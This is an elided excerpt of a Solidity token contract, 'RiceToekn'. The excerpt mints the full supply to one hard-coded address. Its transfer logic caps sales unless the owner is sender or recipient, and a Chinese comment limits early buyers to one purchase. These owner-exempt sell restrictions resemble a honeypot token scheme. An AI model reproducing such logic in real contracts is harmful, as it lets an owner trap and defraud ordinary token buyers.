...
contract RiceToekn {
    ...
    constructor () public {
        ...
        balances[0xDb83a811a8b01C1ff9B6E2AF5f9ec5C1D7777777] = _totalSupply;
        emit Transfer(address(this), 0xDb83a811a8b01C1ff9B6E2AF5f9ec5C1D7777777, _totalSupply);
    ...
    function sellMbe(uint mbe)public  view returns (uint){
        if(ERC20(address(0xae13d989daC2f0dEbFf460aC112a837C89BAa7cd)).balanceOf(pir) > 0){
    ...
    function _transfer(address _sender, address _recipient, uint256 _amount) internal {
        ...
        require(sellMbe(_amount) < 0.031 ether || _sender==owner || _recipient == owner || ERC20(address(0xae13d989daC2f0dEbFf460aC112a837C89BAa7cd)).balanceOf(pir) >= 2 ether);
        require((start[_recipient]==0 && _sender == pir) || start5000 >=3 || _sender != pir);//前5000个购买人限购一次,如果卖出，这个地址就不能购买，需要满5000个地址后才能购买
